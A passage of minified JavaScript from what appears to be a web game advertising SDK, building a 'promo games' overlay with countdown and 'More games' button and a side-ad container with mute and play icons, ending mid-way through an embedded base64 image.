                        c += "." + this.elements.close.classList[0] + ":before{content: ' '; position: absolute;  border-radius: 50%; width: 30px; height: 30px; top: 6px; right: 7px; background-size:100%; background-repeat:no-repeat;}";
                        c += "." + this.elements.close.classList[0] + ":before{background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='26px' height='26px'%3E%3Cpath fill-rule='evenodd' fill='rgb(123, 123, 132)' d='M13.000,26.000 C5.820,26.000 0.000,20.180 0.000,13.000 C0.000,5.820 5.820,0.000 13.000,0.000 C20.180,0.000 26.000,5.820 26.000,13.000 C26.000,20.180 20.180,26.000 13.000,26.000 ZM17.966,10.625 C18.473,10.118 18.473,9.296 17.966,8.789 C17.460,8.283 16.638,8.283 16.131,8.789 L13.378,11.543 L10.625,8.789 C10.118,8.283 9.296,8.283 8.789,8.789 C8.283,9.296 8.283,10.118 8.789,10.625 L11.543,13.378 L8.789,16.131 C8.283,16.638 8.283,17.460 8.789,17.966 C9.296,18.473 10.118,18.473 10.625,17.966 L13.378,15.213 L16.131,17.966 C16.638,18.473 17.460,18.473 17.966,17.966 C18.473,17.460 18.473,16.638 17.966,16.131 L15.213,13.378 L17.966,10.625 Z'/%3E%3C/svg%3E\");}";
                        c += "." + this.elements.close.classList[0] + ":hover:before{ opacity:.5; }";
                        a.s(c);
                        this.container.appendChild(this.elements.close);
                        this.elements.close.addEventListener(a.na, function(g) {
                            g && (g.preventDefault(), g.stopPropagation());
                            this.aa();
                            this.close();
                            a.destroy();
                            return !1
                        }.bind(this), !0);
                        this.elements.Qb = a.F("a", "PromoGamesRcallBtn");
                        this.elements.Qb.classList.add("removed");
                        c = "." + this.elements.Qb.classList[0] + "{position:absolute; top:10px; right:10px; width:40px; height:40px; cursor:pointer; background-repeat:no-repeat; background-position:center; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAjCAYAAAFp3oPPAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA3ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo0YmE4ZWZmNi1hZjM0LTMxNGUtYTQ2Zi0xNDBlZTI5NDg5MjIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzdDNTNDMERDRTQwMTFFOThGNTM4REQ3M0YzMzM0NTYiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzdDNTNDMENDRTQwMTFFOThGNTM4REQ3M0YzMzM0NTYiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NDViODU0N2MtZWY5ZS03OTQ1LWJlNDYtNTdlODVmMzVmNzRiIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjRiYThlZmY2LWFmMzQtMzE0ZS1hNDZmLTE0MGVlMjk0ODkyMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pobv6l8AAAS+SURBVHjaYvj//z8DFFfA2IwgAgiMGRCAmwlIVEI5HUBsDcSHsKn0hplnD6XrQDRAAMEEFYE4FsRmASq1AeLvQHwNpA9kwRcg3gY1xxjd8L8sUMZvIL4EYgAEEAOS622AmBmIDaCWwH0EMkYRqPYREBswYAe/WKA+wgcug1y4BIjDgfgsmuQfmDcAAgjmahiIBWJpIF4FxPfgomhBrgh1OMgDRsjRYAcKZbQARrbyIshN/3AoAIErQKwMUnQEKgDzZTtSUOsCcRi2uEQG70CaQSY1gOICh6L7oCCCKboPdSQyAIVbBXrc1SOxNZFSDgNAAKEHJgiAgsQJiPcgeQoGzIHYE4j3A/FBZAlkg0DWLwDiF0CsD8QsOPwCDl8gFgDiDGiqhxvUAMWgFMXMQBwABdoFIK4H4kaQQTFAxlIgVgBiIQbSwDtoAMeAQlsWFJ5AzI+kYAcQn4Gyz6CxdyGpg+mRhWUUMagiAxJdBPKaKih7MkGdxg415CwJhoDUwhxxFzmNwLKLPpTNjJRtYHmeGSqnglya4UpHMKAEzRQyUP4TID6KklmRAEAA4TII5GVHaE4CpZcPoPICmhD/ETKEGZoo3wPxGiB+hSQHShbB0PDoQMl4SP5TgJayTFC+CBBrA7ExlBaBioMsroaqRwkXESBOgdogBI0BBjxZHJT4ioB4ERC/YYJK5EANkCZgAANUHqSuD6oP7BJnIP0YGvL6JKQZUF0gDMQ6IJfYAvEtaEyQAnSgJYINE7RSgkUrKQCm/hWI8QCLgp1AbArErEB8HEqbomVIGHiAq2AShlbFC6AGgEq8BBxFyH+QIXJYJEyQ2JvQaHQgB/ION5Tzj8QwgamXhNVC8tBqiRRwBertI0zQkj8R2g54QaQBL6Hqc0H6kZN9HDQVEpvsM4F4NSjZo2fAKiQ+rgwIwqXYMiAMgGKrHIgfAvFapIQIAmxAHAjEKkDciVy1UqVQAgjQe/mzNBAEUXw9BP8QRTRyqdTeyk5b7cVCG6ONha1fIrWgjSI2gopFsDUgqbUQ/AAWIYhIPAXBqAHBuBN+A8uZOxPNOTCQ29ztzs6+eW82jiJdExjMQOwpxt4b+TDmBYKShQc4MYVNFYUQ1L/+tEhcMDLpkvWM9Xt2c4P+tWPjZGcCFOXZREvBCFKWOYMTzkupPANdey0WxwMBKLX71rPW+6wfg7ymwXTD2qPWD+hwDUrmm7+bBHXnBLWGRu0r+DQYwcGG9Sfre+xquAUV+I1pHWpvLdy2JfiSYDx06c36DpgYI0NJWeBkfpVMbWrppQBWHbZJMhDD/Gl+56m+OQ8OuHV6C9/8j/kORcj9aNJzyEitN+LjgtO6njI274xd8Wz4X8cKEfO56wiQhzwCGXT+qEV8nAN4gV4FrJ1ZL6IsRZ71ghzwfi5ivlqoB3/WFkg6mG0+TkNUSVsZ8utBfy48mLVK/2l4IUg4kMBh4QUquaiX3F2YVcS/i7IrJRRIySnrRVRX1v9sxsAjsGKlwwxc4T5iwOg6J/KNgcPalEVlD50j64Q2SRArsPtRnDaFLY1q+417nTHnbfRuJnQfmnXa9bZUu5kJQ09bn4It6+z6kVR/0GT3swmf7El2r61f8l6sfQFYr3p3gSLOrwAAAABJRU5ErkJggg==);}";
                        c += "." + this.elements.Qb.classList[0] + ":hover{opacity:.5;}";
                        this.elements.Qb.setAttribute("title", "More games");
                        a.s(c);
                        a.G().appendChild(this.elements.Qb);
                        this.elements.Qb.addEventListener(a.na, function() {
                            this.elements.close.innerText = "Close";
                            this.gf = !1;
                            this.show()
                        }.bind(this));
                        var e = a.F("ul", "PromoGamesItemsHolder");
                        c = "." + e.classList[0] + "{ display:block; height:70%; text-align:center; padding:10px 0;  margin:0 auto; box-sizing:border-box; overflow:hidden; margin-top:30px;}";
                        a.s(c);
                        this.container.appendChild(e);
                        a.s(".wgPromoGamesItem{ margin:0; padding:0; width:32.2%; height:100%; display:inline-block;  list-style-type:none; border:5px solid #cdcdcc; padding:5px; background:#000; box-sizing:border-box;  cursor:pointer;}.wgPromoGamesItemThumb{ width:100%; height:70%; position:relative; background-size:cover; background-repeat:no-repeat; background-position: center center; overflow:hidden; }.wgPromoGamesItemCta{ width:100%; height:30%; overflow:hidden; }.wgPromoGamesItemCtaAnchor{ display:flex;  justify-content: center; align-items:end; height:100%; padding:5px; box-sizing:border-box; font-size:16px;  font-family: 'roboto', sans-serif; font-weight: 400; font-size: 18px; cursor:pointer; color:#f0f0f0; text-transform: uppercase; transition:all .3s;}.wgPromoGamesItem{transition:all .3s; }.wgPromoGamesItem:nth-child(even){margin:0 10px; }.wgPromoGamesItem:hover{background:#e04204; }.wgPromoGamesItem:hover .wgPromoGamesItemCtaAnchor{ color:#fff; background:#e04204; text-shadow: 1px 1px rgba(0,0,0,.8); }.wgPromoGamesPlayNow{ position:absolute; width:100%; left:0; bottom:0; background:rgba(0,0,0,.5); padding:10px; text-align:center; box-sizing:border-box;}.wgPromoGamesPlayNow > div:first-child{ border-radius:5px; border:1px solid #85c62d; color:#fff; text-shadow: 1px 1px rgba(0,0,0,.8); padding:10px;  font-family: 'roboto', sans-serif; background:linear-gradient(-10deg, rgba(66,178,5,1) 0%, #43862e 100%);}.wgPromoGamesPlayNow:hover > div:first-child{ border-radius:5px; border:1px solid #85c62d; color:#fff; padding:10px;  font-family: 'roboto', sans-serif; background:linear-gradient(-10deg, #367b21, rgba(66,178,5,1) 0% 100%);}");
                        a.Nh(b, function(g) {
                            var p = 0;
                            g = JSON.parse(g);
                            g = a.Ak(Object.values(g)).slice(0, 3);
                            for (var m in g) {
                                var r = this.ff(g[m]);
                                this.elements.items.push(r);
                                e.appendChild(r);
                                p++
                            }
                        }.bind(this))
                    }.call(this)
                },
                ff: function(b) {
                    var c = a.F("li", "PromoGamesItem"),
                        d = a.F("div", "PromoGamesItemThumb");
                    d.style = "background-image:url(" + b.img + ")";
                    var e = a.F("div", "PromoGamesPlayNow");
                    e.innerHTML = "<div>" + (a.options.playGameText ? a.options.playGameText : "Play game") + "</div>";
                    d.appendChild(e);
                    c.appendChild(d);
                    d = a.F("div", "PromoGamesItemCta");
                    c.appendChild(d);
                    e = a.F("a", "PromoGamesItemCtaAnchor");
                    e.innerHTML = b.title;
                    d.appendChild(e);
                    c.addEventListener(a.na, function(g) {
                        g.preventDefault();
                        b.ql = a.options.playGameText ? a.options.playGameText : "Play game";
                        a.hd ? (a.j(55, b.url), window.top.postMessage('wgafg://{"action":"fetchAd", "data":' + JSON.stringify(b) + "}")) : (a.j(56, b.url), a.promoGames.Sf = b, a.promoGames.close(), a.updateSplash("preroll", b), a.Ee = !0, a.fetchAd.apply(a, w$(a.options.$c)));
                        return !1
                    }.bind(a));
                    return c
                },
                bh: -1,
                Ek: function() {
                    this.bh = setInterval(function() {
                        this.af--;
                        this.ni();
                        0 === this.af && (this.close(), a.destroy())
                    }.bind(this), 1E3)
                },
                vg: function() {
                    this.elements.Qb.classList.remove("removed")
                },
                yj: function() {
                    this.elements.Qb.classList.add("removed")
                },
                close: function() {
                    clearInterval(this.bh);
                    this.af = 20;
                    this.ni();
                    this.vg();
                    this.aa();
                    if ("function" === typeof window[a.options.midrollCallback]) try {
                        window[f.midrollCallback].call()
                    } catch (b) {}
                },
                ni: function() {
                    this.elements.close.innerText = this.qh()
                },
                show: function() {
                    this.yj();
                    a.O = !0;
                    a.Ed();
                    a.Td();
                    a.u().insertBefore(a.promoGames.container, a.u().firstChild);
                    this.container.classList.remove("removed");
                    a.u().classList.add("wgMidroll");
                    a.la.classList.remove("lowZi");
                    a.la.classList.remove("wgHidden");
                    a.la.classList.remove("removed");
                    a.vb();
                    !0 === this.gf && this.Ek();
                    this.gf = !0;
                    a.rg("promoGamesRecall", !0)
                },
                aa: function() {
                    this.container.classList.add("removed")
                },
                Vj: function() {
                    window.location.href = a.promoGames.Sf.url;
                    return !1
                }
            },
            mad: {
                ha: !1,
                visible: !1,
                elements: {
                    sa: null,
                    container: null,
                    label: null,
                    Ua: null,
                    Oc: null,
                    Ia: null,
                    time: 0,
                    progress: null,
                    Yc: null,
                    Tc: null,
                    Id: null,
                    control: {
                        state: {
                            muted: !0,
                            Je: !1
                        },
                        mc: null,
                        Ic: null
                    }
                },
                Lb: {
                    qb: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3E%3Ccircle fill='%232e2f33' cx='15' cy='15' r='15' /%3E%3Cpath fill='%23fff' d='M17,7.63v1a6.54,6.54,0,0,1,0,12.84v.95A7.47,7.47,0,0,0,17,7.63Z' /%3E%3Cpath fill='%23fff' d='M20.45,15A4.75,4.75,0,0,0,17,10.43v1.11a3.68,3.68,0,0,1,0,6.92v1.11A4.75,4.75,0,0,0,20.45,15Z' /%3E%3Cpolygon fill='%23fff' points='6.8 11.48 6.8 18.52 9.85 18.52 14.74 22.5 14.74 7.5 9.85 11.48 6.8 11.48' /%3E%3C/svg%3E",
                    yb: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3E%3Ccircle fill='%232e2f33' cx='15' cy='15' r='15' /%3E%3Cpolygon fill='%23fff' points='6.8 11.48 6.8 18.52 9.85 18.52 14.74 22.5 14.74 7.5 9.85 11.48 6.8 11.48' /%3E%3Cpolygon fill='%23fff' points='23.42 12.61 22.5 11.69 20.11 14.08 17.71 11.69 16.79 12.61 19.18 15 16.79 17.39 17.71 18.32 20.11 15.92 22.5 18.32 23.42 17.39 21.03 15 23.42 12.61' /%3E%3C/svg%3E",
                    resume: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Ccircle fill='%232e2f33' opacity='1' cx='40' cy='40' r='40' /%3E%3Cpath fill='%23fff' d='M54.8,38.32,32.58,25.5a1.93,1.93,0,0,0-2.9,1.67V52.83a1.93,1.93,0,0,0,2.9,1.67L54.8,41.68A1.94,1.94,0,0,0,54.8,38.32Z' /%3E%3C/svg%3E"
                },
                init: function() {
                    return !0 === a.noAd && "undefined" !== typeof a.options.exctpos && -1 < a.options.exctpos.indexOf("bad") ? !1 : function() {
                        var b = this,
                            c = document.body.getBoundingClientRect(),
                            d = this.ph().getBoundingClientRect(),
                            e = d.top - c.top;
                        c = "left" === a.options.mad.Bk ? Math.abs(c.left - d.left) : c.width - d.right;
                        if (300 > c) return !1;
                        var g = "";
                        this.elements.sa = a.F("div", "mad");
                        this.elements.sa.classList.add("removed");
                        g += "." + this.elements.sa.classList[0] + "{ position:absolute; top:0; padding:0px 10px; " + ("left" === a.options.mad.Bk ? "left" : "right") + ":0; width:350px; height:100%; box-sizing:border-box; z-index:-1; overflow:visible !important;}";
                        g += "." + this.elements.sa.classList[0] + ".removed{ pointer-events:none;}";
                        g += "." + this.elements.sa.classList[0] + " *{ box-sizing:border-box; font-family:'Roboto'; }";
                        "undefined" !== typeof a.options.mad.defaultZindex && (g += "." + this.elements.sa.classList[0] + "{ z-index :" + a.options.mad.defaultZindex + "}");
                        a.s(g);
                        this.elements.container = a.F("div", "madContainer");
                        this.elements.sa.appendChild(this.elements.container);
                        g = "." + this.elements.container.classList[0] + "{ display:inline-block; transition:all .4s; border-radius:15px; overflow:hidden; border:5px solid #4a4a4a; overflow:hidden; background-color:#2e2f33; border:2px solid #3c4043; position:relative; width:auto; height:100%; background-repeat:no-repeat; background-position:center 85%; padding:15px; }";
                        g += "." + this.elements.container.classList[0] + "{ background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOoAAACECAYAAAHpbYfyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjVFQUNDOTQ0RTQwQzExRTlBMTdGQjQ4MkQ0OUFENjM5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjVFQUNDOTQ1RTQwQzExRTlBMTdGQjQ4MkQ0OUFENjM5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NUVBQ0M5NDJFNDBDMTFFOUExN0ZCNDgyRDQ5QUQ2MzkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NUVBQ0M5NDNFNDBDMTFFOUExN0ZCNDgyRDQ5QUQ2MzkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6GkiqoAAAppElEQVR42uxU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